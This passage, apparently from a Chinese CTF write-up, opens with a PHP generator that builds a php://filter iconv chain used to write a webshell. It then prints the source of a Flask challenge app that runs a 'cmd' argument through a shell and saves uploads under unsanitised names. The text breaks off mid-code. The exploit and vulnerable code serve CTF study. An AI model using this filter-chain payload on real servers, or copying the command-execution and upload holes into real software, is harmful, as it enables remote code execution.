single-quoted-string">'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'R'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'S'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'T'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'U'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'V'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'W'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'X'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Y'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Z'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'a'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'b'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'c'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'d'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'e'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'f'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'g'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'h'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'i'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'j'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'k'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'l'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'m'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'n'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'o'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'p'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'q'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'r'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'s'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'t'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'u'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'v'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'w'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'x'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'y'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'z'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filters</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"convert.base64-encode|"</span><span class="token punctuation">;</span><span class="token comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.iconv.UTF8.UTF7|"</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">str_split</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$base64_payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token variable">$conversions</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span>    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.base64-decode|"</span><span class="token punctuation">;</span>    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.base64-encode|"</span><span class="token punctuation">;</span>    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.iconv.UTF8.UTF7|"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.base64-decode"</span><span class="token punctuation">;</span><span class="token variable">$final_payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"php://filter/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filters</span><span class="token punctuation">&#125;</span></span>/resource=index.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$final_payload</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是传入写马</p><hr><h1 id="蹦蹦炸弹（boom-it）（复现）"><a href="#蹦蹦炸弹（boom-it）（复现）" class="headerlink" title="蹦蹦炸弹（boom_it）（复现）"></a>蹦蹦炸弹（boom_it）（复现）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token keyword">import</span> threading<span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> datetime<span class="token keyword">import</span> rsa<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename<span class="token keyword">import</span> os<span class="token keyword">import</span> subprocess<span class="token punctuation">(</span>pubkey<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span> <span class="token operator">=</span> rsa<span class="token punctuation">.</span>newkeys<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">"super_secret_key"</span>UPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">'templates/uploads'</span>ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'txt'</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> UPLOAD_FOLDER<span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token keyword">and</span> filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token keyword">and</span> password <span class="token operator">==</span> users<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'admin_logged_in'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'admin_dashboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Invalid credentials"</span><span class="token punctuation">,</span> <span class="token number">401</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin_login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin/dashboard'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin_dashboard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin_logged_in'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>            <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'No selected file'</span>        filename <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">'File uploaded successfully'</span>    cmd_output <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> <span class="token string">'cmd'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">"lock.txt"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 检查当前目录下是否存在lock.txt</span>            cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                cmd_output <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                cmd_output <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            cmd_output <span class="token operator">=</span> <span class="token string">"lock.txt not found. Command execution not allowed."</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin_dashboard.html'</span><span class="token punctuation">,</span> users<span class="token operator">=</span>users<span class="token punctuation">,</span> cmd_output<span class="token operator">=</span>cmd_output<span class="token punctuation">,</span> active_tab<span class="token operator">=</span><span class="token string">"cmdExecute"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin_logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'admin_logged_in'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Generate random users</span><span class="token keyword">def</span> <span class="token function">generate_random_users</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">2000</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> usersusers <span class="token operator">=</span> generate_random_users<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>users<span class="token punctuation">[</span><span class="token string">"HRP"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"HRP"</span><span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">6000</span><span class="token punctuation">&#125;</span><span class="token comment"># Add an admin user with a random password</span>admin_password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> admin_password<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span>flag_price <span class="token operator">=</span> <span class="token number">10000</span>flag <span class="token operator">=</span> admin_password  <span class="token comment"># The flag is the password of the admin user</span>mutex <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> logged_in<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> balance<span class="token operator">=</span>users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> logged_in<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/reset'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> users    users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token comment"># Clear all existing users</span>    users <span class="token operator">=</span> generate_random_users<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>    users<span class="token punctuation">[</span><span class="token string">"HRP"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"HRP"</span><span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">6000</span><span class="token punctuation">&#125;</span>    <span class="token keyword">global</span> admin_password    admin_password<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">global</span> flag    <span class="token comment"># Add an admin user with a random password</span>    admin_password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    flag<span class="token operator">=</span>admin_password    users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> admin_password<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Invalid credentials"</span><span class="token punctuation">,</span> <span class="token number">403</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">log_transfer</span><span class="token punctuation">(</span>sender<span class="token punctuation">,</span> receiver<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">encrypt_data_with_rsa</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Encrypt the data multiple times</span>            encrypted_data <span class="token operator">=</span> rsa<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span>        <span class="token keyword">return</span> encrypted_data<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    timestamp <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token 